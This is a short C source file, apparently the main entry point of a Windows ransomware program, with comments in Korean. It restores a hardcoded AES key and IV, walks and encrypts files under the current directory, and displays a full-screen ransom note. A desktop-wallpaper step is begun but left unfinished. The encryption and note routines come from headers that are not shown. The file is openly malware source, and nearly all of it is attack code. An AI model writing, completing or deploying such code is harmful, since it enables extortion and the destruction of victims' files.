#include <windows.h>
#include <stdio.h>
#include "encryptor.h"
#include "walker.h"
#include "ransomenote.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char aes_key[AES_KEY_SIZE];
    unsigned char iv[IV_SIZE];

    // 1. 하드코딩된 키/IV 복원
    restore_key(aes_key);
    restore_iv(iv);

    // 2. 대상 디렉토리 (현재 경로 기준)
    const char* target_dir = ".";
    // printf 생략 (콘솔 없음)

    // 3. 파일 암호화
    scan_directory(target_dir, aes_key, iv);

    // 4. 랜섬노트 전체화면 경고창
    create_ransom_note();

    // 5. 바탕화면 이미지 변경
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    char* last_backslash = strrchr(exe_path, '\\');
    if (last_backslash) *last_backslash = '\0';

    return 0;
}
